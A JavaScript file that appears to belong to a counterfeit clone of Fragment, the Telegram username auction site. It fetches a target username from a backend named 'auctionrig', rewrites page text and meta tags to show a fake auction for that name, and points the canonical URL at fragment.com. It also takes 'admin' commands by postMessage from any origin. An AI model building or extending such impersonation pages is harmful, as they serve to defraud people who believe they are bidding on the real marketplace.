/**
 * Fragment Admin Storage
 * Loads username from Render backend (GitHub) or URL parameter
 */

(function() {
  'use strict';

  // Default username if none is set
  const DEFAULT_USERNAME = 'board';
  const RENDER_BACKEND_URL = 'https://auctionrig.onrender.com';
  
  // CRITICAL: Load IMMEDIATELY before page renders to prevent flash
  // Priority 1: URL parameter (for sharing links)
  const urlParams = new URLSearchParams(window.location.search);
  let savedUsername = urlParams.get('u') || urlParams.get('username');
  
  // Priority 2: localStorage (temporary until backend loads)
  if (!savedUsername) {
    savedUsername = localStorage.getItem('fragmentUsername') || DEFAULT_USERNAME;
  } else {
    // If we got username from URL, save it to localStorage
    localStorage.setItem('fragmentUsername', savedUsername);
  }
  
  // Apply changes synchronously before DOMContentLoaded
  applyUsernameSync(savedUsername);

  function applyUsernameSync(newUsername) {
    // Update page title immediately
    if (document.title && document.title === 'Fragment') {
      document.title = newUsername + ' – Fragment';
    }
  }

  // Load from backend when DOM is ready
  window.addEventListener('DOMContentLoaded', async function() {
    // If URL parameter exists, use it (shared links take priority)
    if (urlParams.get('u') || urlParams.get('username')) {
      applyStoredUsername(savedUsername);
      return;
    }
    
    // Otherwise, fetch current username from backend
    try {
      const response = await fetch(`${RENDER_BACKEND_URL}/api/current-username`);
      const data = await response.json();
      
      if (data.username) {
        savedUsername = data.username;
        localStorage.setItem('fragmentUsername', savedUsername);
      }
    } catch (error) {
      savedUsername = localStorage.getItem('fragmentUsername') || DEFAULT_USERNAME;
    }
    
    applyStoredUsername(savedUsername);
  });

  function applyStoredUsername(newUsername) {
    // Update page title
    if (document.title === 'Fragment') {
      document.title = newUsername + ' – Fragment';
    }

    // Update section header with username (with data-username-placeholder attribute)
    $('[data-username-placeholder]').text(newUsername);

    // Update specific username fields with data attributes
    $('[data-username-telegram]').text('@' + newUsername);
    $('[data-username-web]').text('t.me/' + newUsername);
    $('[data-username-ton]').text(newUsername);

    // Update ALL subdomain elements as fallback
    $('.subdomain').text(newUsername);

    // Update meta tags
    $('meta[property="og:title"]').attr('content', 'Buy @' + newUsername);
    $('meta[property="og:description"]').attr('content', 'An auction to get the Telegram username @' + newUsername + ' is in progress.');
    $('meta[property="og:url"]').attr('content', 'https://fragment.com/username/' + newUsername);
    $('link[rel="canonical"]').attr('href', 'https://fragment.com/username/' + newUsername);

    // Update popup content
    $('.js-howitworks-popup h4, .js-howitworks-popup p').each(function() {
      const html = $(this).html();
      if (html.includes('@board') || html.includes('@...')) {
        $(this).html(html.replace(/@board|@\.\.\./g, '@' + newUsername));
      }
    });
  }

  // Listen for storage updates from other tabs
  window.addEventListener('storage', function(e) {
    if (e.key === 'fragmentUsername' && e.newValue) {
      // Don't reload - let the page update dynamically
      // location.reload();
    }
  });

  // Update admin receiver to also save to localStorage
  window.addEventListener('message', function(event) {
    const data = event.data;
    
    if (data.type === 'FRAGMENT_ADMIN_COMMAND' && data.action === 'setUsername') {
      const username = data.username;
      
      // Save to localStorage
      localStorage.setItem('fragmentUsername', username);
      
      // Apply changes
      applyStoredUsername(username);
      
      // Send response
      event.source.postMessage({
        type: 'FRAGMENT_ADMIN_RESPONSE',
        success: true,
        message: 'Username saved to localStorage: @' + username
      }, event.origin);
    }
  });

})();
